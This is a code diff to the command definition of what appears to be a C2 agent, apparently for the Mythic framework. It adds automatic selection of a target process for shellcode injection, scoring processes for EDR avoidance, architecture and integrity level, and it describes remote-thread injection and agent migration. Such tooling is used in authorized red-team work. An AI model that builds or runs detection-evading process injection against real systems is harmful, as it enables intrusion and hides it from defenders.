@@ -79,19 +79,39 @@ func init() {
 				Name:                 "pid",
 				ModalDisplayName:     "Target PID",
 				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
-				Description:          "The process ID to inject shellcode into (for migrate: the process to migrate the agent into)",
+				Description:          "Process ID to inject into. Leave empty when using target auto-selection.",
 				DynamicQueryFunction: getProcessList,
 				DefaultValue:         "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
-						ParameterIsRequired: true,
+						ParameterIsRequired: false,
 						GroupName:           "Default",
 						UIModalPosition:     2,
 					},
 					{
-						ParameterIsRequired: true,
+						ParameterIsRequired: false,
 						GroupName:           "New File",
 						UIModalPosition:     2,
+					},
+				},
+			},
+			{
+				Name:             "target",
+				ModalDisplayName: "Target Selection",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Description:      "Auto-select injection target. Scores running processes for suitability (EDR avoidance, arch match, integrity level). Overrides PID when set.",
+				DefaultValue:     "",
+				Choices:          []string{"", "auto", "auto-elevated", "auto-user"},
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+						UIModalPosition:     4,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "New File",
+						UIModalPosition:     4,
 					},
 				},
 			},
@@ -163,18 +183,18 @@ func init() {
 				return response
 			}
 
-			// Get the target PID
+			// Get target selection mode (if any)
+			target, _ := taskData.Args.GetStringArg("target")
+
+			// Get the target PID (may be 0 if using auto-selection)
 			pid, err := parsePIDFromArg(taskData)
 			if err != nil {
-				logging.LogError(err, "Failed to get PID")
-				response.Success = false
-				response.Error = "Failed to get target PID: " + err.Error()
-				return response
+				pid = 0 // Will use target auto-selection
 			}
 
-			if pid <= 0 {
+			if pid <= 0 && target == "" {
 				response.Success = false
-				response.Error = "Invalid PID specified (must be greater than 0)"
+				response.Error = "Specify either a PID or a target selection mode (auto, auto-elevated, auto-user)"
 				return response
 			}
 
@@ -183,10 +203,18 @@ func init() {
 			if action == "migrate" {
 				actionLabel = "Migrate"
 			}
-			displayParams := fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget PID: %d", actionLabel, filename, len(fileContents), pid)
+			var displayParams string
+			if target != "" {
+				displayParams = fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget: %s (auto-select)", actionLabel, filename, len(fileContents), target)
+			} else {
+				displayParams = fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget PID: %d", actionLabel, filename, len(fileContents), pid)
+			}
 			response.DisplayParams = &displayParams
 
 			artifactDesc := fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread into PID %d (%d bytes)", pid, len(fileContents))
+			if target != "" {
+				artifactDesc = fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread with auto-target '%s' (%d bytes)", target, len(fileContents))
+			}
 			if action == "migrate" {
 				artifactDesc += " [MIGRATE: agent will self-terminate after injection]"
 			}
@@ -197,6 +225,7 @@ func init() {
 			params := map[string]interface{}{
 				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
 				"pid":           pid,
+				"target":        target,
 				"action":        action,
 			}
 
